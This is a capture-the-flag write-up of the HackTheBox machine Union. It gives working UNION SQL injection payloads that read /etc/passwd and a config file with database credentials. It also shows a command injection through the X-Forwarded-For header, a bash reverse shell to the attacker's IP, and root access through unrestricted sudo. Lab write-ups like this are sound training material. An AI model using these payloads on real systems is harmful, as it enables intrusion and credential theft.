---
title: HTB: Union
url: https://0xdf.gitlab.io/2021/11/22/htb-union.html
date: 2021-11-22T10:00:00+00:00
difficulty: Medium [30]
os: Linux
tags: ctf, htb-union, hackthebox, uhc, nmap, sqli, filter, waf, feroxbuster, burp, burp-repeater, sqli-file, credentials, injection, command-injection, sudo, iptables, cpts-like
---

![Union](https://0xdfimages.gitlab.io/img/union-cover.png)

The November Ultimate Hacking Championship qualifier box is Union. There’s a tricky-to-find union SQL injection that will allow for file reads, which leaks the users on the box as well as the password for the database. Those combine to get SSH access. Once on the box, I’ll notice that www-data is modifying the firewall, which is a privileged action, using sudo. Analysis of the page source shows it is command injectable via the X-Forwarded-For header, which provides a shell as www-data. This account has full sudo rights, providing root access.

## Box Info

| Name | [Union](https://hackthebox.com/machines/union)  [Union](https://hackthebox.com/machines/union) [Play on HackTheBox](https://hackthebox.com/machines/union) |
| --- | --- |
| Release Date | 22 Nov 2021 |
| Retire Date | 22 Nov 2021 |
| OS | Linux Linux |
| Base Points | Medium [30] |
| First Blood User | N/A (non-competitive) |
| First Blood Root | N/A (non-competitive) |
| Creator | [ippsec ippsec](https://app.hackthebox.com/users/3769) |

## Recon

### nmap

`nmap` found only one open TCP port, HTTP (80):

```

oxdf@parrot$ nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.11.128
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 08:29 EST
Nmap scan report for 10.10.11.128
Host is up (0.092s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.64 seconds
oxdf@parrot$ nmap -p 80 -sCV -oA scans/nmap-tcpscripts 10.10.11.128
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 09:58 EST
Nmap scan report for 10.10.11.128
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.07 seconds

```

NGINX version don’t tie as nicely with OS versions, so it’s hard to get a read on the OS version, beyond that it’s Ubuntu.

### Website - TCP 80

#### Site

The website is about the UHC November Qualifiers:

![image-20211119100020457](https://0xdfimages.gitlab.io/img/image-20211119100020457.png)

If I enter my name and click check:

![image-20211119100050512](https://0xdfimages.gitlab.io/img/image-20211119100050512.png)

Interestingly, I later learned after looking at the page source the `0x` was a string that the filter (“WAF”) was matching on, so that’s a partial response. If I try some other username:

![image-20211119160955072](https://0xdfimages.gitlab.io/img/image-20211119160955072.png)

If I try the box creator, it gets a different message:

![image-20211119101604700](https://0xdfimages.gitlab.io/img/image-20211119101604700.png)

#### Tech Stack

The form creates a POST request to `index.php`:

```

POST /index.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 9
Origin: http://10.10.11.128
Connection: close
Referer: http://10.10.11.128/
Cookie: PHPSESSID=orpc54gjbbmaih8loabi2ru7bi

player=df

```

The response doesn’t show much:

```

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Nov 2021 21:09:48 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 122

Congratulations df you may compete in this tournament!<br /><br />Complete the challenge <a href="/challenge.php">here</a>

```

The site is setting a PHPSESSID cookie.

#### /challenge.php

This path presents a new page that looks very similar to the previous one:

![image-20211119100852069](https://0xdfimages.gitlab.io/img/image-20211119100852069.png)

This time it’s asking for a flag. Submitting something returns the exact same page:

![image-20211119101132941](https://0xdfimages.gitlab.io/img/image-20211119101132941.png)

I tried some basic fuzzing, but didn’t find anything useful.

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP:

```

oxdf@parrot$ feroxbuster -u http://10.10.11.128 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.128
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       12w      178c http://10.10.11.128/css
200        0l        0w        0c http://10.10.11.128/config.php
200       42l       93w        0c http://10.10.11.128/index.php
200       20l       61w        0c http://10.10.11.128/challenge.php
200        1l        2w        0c http://10.10.11.128/firewall.php
[####################] - 1m    119996/119996  0s      found:5       errors:0      
[####################] - 1m     59998/59998   532/s   http://10.10.11.128
[####################] - 1m     59998/59998   532/s   http://10.10.11.128/css

```

I already knew about `index.php` and `challenge.php`. `config.php` returns an empty response. This page is almost certainly being included by one or more of the other pages.

`firewall.php` returns a 200 OK, but it just says “Access Denied”.

## Shell as uhc

### Detect SQL Injection

#### Failures

At first, this box will seem to be not vulnerable to SQL injection. Sending `player=0xdf'`  returns the same message, as if it is handling the `'` just fine.

Trying a similar payload with a player who gets the other result, `player=ippsec'` returns the message as if that user isn’t in the database. The form could be not vulnerable to SQL injection, or it could be handling errors the same as finding nothing.

#### Identifying Small Difference

When I try to send `df'`, it returns with the error and the link:

![image-20211122120042188](https://0xdfimages.gitlab.io/img/image-20211122120042188.png)

When I try to add an `or`, it returns the same message, but no link:

![image-20211122120110983](https://0xdfimages.gitlab.io/img/image-20211122120110983.png)

This is slightly different, and something I should investigate further.

#### Success

To see if this is really injectable, I want to to give it a payload that will return the message that it’s not eligible, but for something that almost certainly isn’t in the DB.

The query to the DB could look like:

```

SELECT username from users if username = '[user input]';

```

If that’s the case, passing in something like `ippsec';-- -` would return the same thing as `ippsec`:

```

SELECT username from users if username = 'ippsec';-- -';

```

In fact, that works:

![image-20211119110357234](https://0xdfimages.gitlab.io/img/image-20211119110357234.png)

That would only work if there is a user in the DB `ippsec';-- -` (which seems incredibly unlikely), or if I’ve successfully injected.

#### “WAF”

This took me a bit longer to find because there’s some light filtering going on, likely to break `sqlmap`, but in a way that would not be an unrealistic implementation of a basic web application firewall (WAF).

For example, it seems that `0x` actually triggers the WAF:

![image-20211119111258068](https://0xdfimages.gitlab.io/img/image-20211119111258068.png)

You can see that the same query that returned not elligible is now returning that the user can play, with only a change after the comment. That means that something is looking at the entire string and filtering it.

In theory, I could send `player=df' or 1=1;-- -` and get rows back, but it doesn’t work:

![image-20211119111413861](https://0xdfimages.gitlab.io/img/image-20211119111413861.png)

It also doesn’t include the challenge link, which lines up with other cases where I’m being filtered. Just having “ or “ in the string triggers the filtering/WAF:

![image-20211119111508530](https://0xdfimages.gitlab.io/img/image-20211119111508530.png)

### UNION Injection

#### Detection

In the example above, not only does it return data showing I successfully manipulated the SQL query, but it also displays back the name “ippsec”, not “ippsec’;– -“. That means what’s being displayed back when the username is found is the username from the database, not the username from the input (though from the developer’s point of view, those two would be the same).

That means I can do a UNION injection to read data:

![image-20211119111707394](https://0xdfimages.gitlab.io/img/image-20211119111707394.png)

More interestingly:

![image-20211119111734609](https://0xdfimages.gitlab.io/img/image-20211119111734609.png)

#### One Liner

I’ll use this Bash one liner to query the DB:

```

curl -s -X POST http://10.10.11.128 -d "player=' union select user();-- -" 
  | sed 's/Sorry, //' 
  | sed 's/ you are not eligible due to already qualifying.//'
echo

```

This will get the result I’m looking for and remove the constant data that I don’t want. The extra `echo` is just to put a newline on the end.

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select user();-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
uhc@localhost

```

#### DB Enumeration

There are five databases on the host, but really only `november` is interesting:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata;-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
mysql,information_schema,performance_schema,sys,november

```

The `november` DB has two tables:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema='november';-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
flag,players

```

Interestingly, each table only has one column:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(table_name, ':', column_name) from INFORMATION_SCHEMA.columns where table_schema='november';-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
flag:one,players:player

```

I can grab the flag:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(one) from flag;-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
UHC{F1rst_5tep_2_Qualify}

```

And also the list of users:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select group_concat(player) from players;-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
ippsec,celesian,big0us,luska,tinyboy

```

#### Enter Flag

With the flag, I can enter it on `challenge.php`:

![image-20211119161426691](https://0xdfimages.gitlab.io/img/image-20211119161426691.png)

Where only 80 was open on initial `nmap`, now 22 is open as well:

```

oxdf@parrot$ nmap -p 22 10.10.11.128
Starting Nmap 7.80 ( https://nmap.org ) at 2021-11-19 16:14 EST
Nmap scan report for 10.10.11.128
Host is up (0.089s latency).

PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds

```

Also interesting, that POST request to `challenge.php` returned a 302 redirect to `firewall.php`:

```

HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 19 Nov 2021 21:14:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: /firewall.php
Content-Length: 0

```

It’s `firewall.php` that reports back that I have this access.

#### Read Files

SQL is configured with permissions to read files as well:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/etc/lsb-release');-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.3 LTS"

```

`/etc/passwd` gives a list of users on the host:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/etc/passwd');-- 
-" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
root:x:0:0:root:/root:/bin/bash
...[snip]...
htb:x:1000:1000:htb:/home/htb:/bin/bash
...[snip]...
uhc:x:1001:1001:,,,:/home/uhc:/bin/bash

```

I can also read the page source:

```

oxdf@parrot$ curl -s -X POST http://10.10.11.128 -d "player=' union select load_file('/var/www/html/ind
ex.php');-- -" | sed 's/Sorry, //' | sed 's/ you are not eligible due to already qualifying.//'; echo
<?php                                                              
  require('config.php');        
  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
...[snip]...

```

I’m most interested in `config.php` and `firewall.php`. I’ll start with `config.php`:

```

<?php
  session_start();
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-11qual-global-pw";
  $dbname = "november";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>

```

This is what handles the DB connection.

### SSH

I’ve got usernames and now a password, and it happens those work together to get SSH access:

```

oxdf@parrot$ sshpass -p uhc-11qual-global-pw ssh uhc@10.10.11.128
...[snip]...
uhc@union:~$ 

```

And `user.txt`:

```

uhc@union:~$ cat user.txt
bb0c4bf5************************

```

## Shell as www-data

### Enumeration

#### Web Source

With access as uhc, there’s not much new to access. I found myself looking at the web source. `challenge.php` is where I submitted the flag. It has the following logic:

```

<?php
  require('config.php');
  $_SESSION['Authenticated'] = False;

  if ( $_SERVER['REQUEST_METHOD'] == 'POST' ) {
    $sql = "SELECT * FROM flag where one = ?";
    $stmt = $conn->prepare($sql);
    $stmt->bind_param("s", $_POST['flag']);
    $stmt->execute();
    $stmt->store_result();
    if ($stmt->num_rows == 1) {
      $_SESSION['Authenticated'] = True;
      header("Location: /firewall.php");
      exit;
    }
  }
?>
...[snip]...

```

If the correct flag is submitted, then the `Authenticated` value for my session is set to True. That’s why I could access `firewall.php` where I couldn’t before.

Looking at `firewall.php`, it’s got the display HTML, as well as the logic to open the firewall:

```

<?php
require('config.php');

if (!($_SESSION['Authenticated'])) {
  echo "Access Denied";
  exit;
}

?>
<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<div class="container">
                <h1 class="text-center m-5">Join the UHC - November Qualifiers</h1>

        </div>
        <section class="bg-dark text-center p-5 mt-4">
                <div class="container p-5">
<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>
              <h1 class="text-white">Welcome Back!</h1>
              <h3 class="text-white">Your IP Address has now been granted SSH Access.</h3>
                </div>
        </section>
</div>

```

#### Identify Command Injection

This block of code is the insecure part:

```

<?php
  if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  };
  system("sudo /usr/sbin/iptables -A INPUT -s " . $ip . " -j ACCEPT");
?>

```

It’s using `system` to call `sudo iptables`. While I’m sure the developer thought it was ok because the attacker cannot forge their remote address, what I can control is the `X-FORWARDED-FOR` header.

### Command Injection

#### POC

I’ll send the GET request to `firewall.php` over to Burp Repeater to play with it. I’ll add a header:

```

GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
Connection: close
Cookie: PHPSESSID=orpc54gjbbmaih8loabi2ru7bi
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 1.1.1.1; ping -c 1 10.10.14.6;

```

With `tcpdump` listening, I’ll send the request. I get a ping:

```

oxdf@parrot$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
16:28:32.771157 IP 10.10.11.128 > 10.10.14.6: ICMP echo request, id 1, seq 1, length 64
16:28:32.771182 IP 10.10.14.6 > 10.10.11.128: ICMP echo reply, id 1, seq 1, length 64

```

It’s important to have the trailing `;` after my command. Otherwise, it makes:

```

sudo /usr/sbin/iptables -A INPUT -s 1.1.1.1; ping -c 1 10.10.14.6 -j ACCEPT

```

This command will result in an error saying that `ping` has no option `-j`.

#### Reverse Shell

It’s possible that special characters will mess things up, but the first I tried was to just drop a Bash reverse shell into the header:

```

GET /firewall.php HTTP/1.1
Host: 10.10.11.128
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:94.0) Gecko/20100101 Firefox/94.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.128/challenge.php
Connection: close
Cookie: PHPSESSID=orpc54gjbbmaih8loabi2ru7bi
Upgrade-Insecure-Requests: 1
X-FORWARDED-FOR: 1.1.1.1; bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1";

```

On sending (with `nc` listening), it worked:

```

oxdf@parrot$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.128 49486
bash: cannot set terminal process group (793): Inappropriate ioctl for device
bash: no job control in this shell
www-data@union:~/html$ 

```

I’ll upgrade my shell with `script`:

```

www-data@union:~/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null 
www-data@union:~/html$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@parrot$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@union:~/html$ 

```

## Shell as root

It was clear in the PHP code that www-data has to be able to run `sudo iptables` in order to open ports in the firewall. Running `sudo -l` shows this account has much more privilege:

```

www-data@union:~/html$ sudo -l
Matching Defaults entries for www-data on union:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on union:
    (ALL : ALL) NOPASSWD: ALL

```

It can run any command using `sudo` without a password. I’ll use this to get a shell:

```

www-data@union:~/html$ sudo bash
root@union:/var/www/html#

```

And grab the root flag:

```

root@union:~# cat root.txt
92471af0************************

```